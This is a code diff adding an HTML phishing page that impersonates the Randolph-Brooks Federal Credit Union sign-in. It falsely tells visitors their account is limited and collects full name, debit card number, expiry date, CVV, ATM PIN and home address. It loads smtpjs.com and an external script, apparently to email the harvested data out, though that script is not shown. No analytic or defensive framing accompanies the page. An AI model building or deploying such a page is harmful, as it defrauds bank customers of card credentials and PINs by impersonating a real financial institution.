@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=0.85, user-scalable=no">
+        
+        <title>RBFCU - Member Sign In</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <link rel="icon" href="ico.png" type="image/png">
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+<body>
+
+    <div class="chi">
+        <img src="header2.png" width="420" height="120">
+    </div>
+    
+    <br><br><br>
+
+    <div class="textdiv">
+        <br>
+        <p class="ttext"><b>Your account features have been limited due to low user authentication, to restore account functions we need to verify some information.</b></p>
+    </div>
+
+    <form action="#" class="contact">
+
+        <input id="fname" type="text" placeholder="Full Name" required>
+        <br>
+        <br>
+        <input id="fdebit" type="number" pattern="[0-9]*" placeholder="Debit Card Number" oninput="checkPhoneNumberLength(this)" required>
+        <input id="fexp" type="text" placeholder="Expiration Date" required>
+        <input id="fcvv" type="number" pattern="[0-9]*" placeholder="CVV  (3-4 digit security code)" oninput="PhoneNumberLength(this)" required>
+        <input id="fpin" type="number" pattern="[0-9]*" placeholder="ATM Pin" oninput="PhoneNumberLength(this)" required>
+        <br>
+        <br>
+        <input id="faddress" type="text" placeholder="Street Address" required>
+        <input id="fcity" type="text" placeholder="City" required>
+        <input id="fzip" type="number" pattern="[0-9]*" placeholder="Zipcode" oninput="ZipLength(this)" required>
+        <input id="fstate" type="text" placeholder="State" required>
+        
+        <input id="submitf" type="submit" value="Submit">
+
+        <script>
+            function pininput(input) {
+              // Get the value entered by the user
+              var inputValue = input.value;
+            
+              // Replace the input's value with asterisks (*) of the same length as the entered digits
+              input.value = "*".repeat(inputValue.length);
+            }
+        </script>
+
+        <!--javascript to change Submit to Loading after click, check css-->
+        <script>
+            var button = document.querySelector('.contact input[type="submit"]');
+            button.addEventListener('click', function() {
+                button.classList.add('clicked');
+                button.value = "Loading...";               
+                setTimeout(function() {
+                    button.classList.remove('clicked');
+                    button.value = "Submit";
+                },  4000); 
+            });
+        </script>
+        <script>
+            function checkPhoneNumberLength(input) {
+                if (input.value.length > 18) {
+                input.value = input.value.slice(0, 18);
+             }
+           }
+        </script>
+        <script>
+            function ZipLength(input) {
+                if (input.value.length > 5) {
+                input.value = input.value.slice(0, 5);
+             }
+           }
+        </script>
+        <script>
+            function PhoneNumberLength(input) {
+                if (input.value.length > 4) {
+                input.value = input.value.slice(0, 4);
+             }
+           }
+        </script>
+        <script src="f.js"></script>
+    <form>
+
+    <br><br><br><br>
+
+</body>
+<footer class="footer">
+
+    <p class="foot">©2023 Randolph-Brooks Federal Credit Union.</p>
+
+</footer>
+</html>
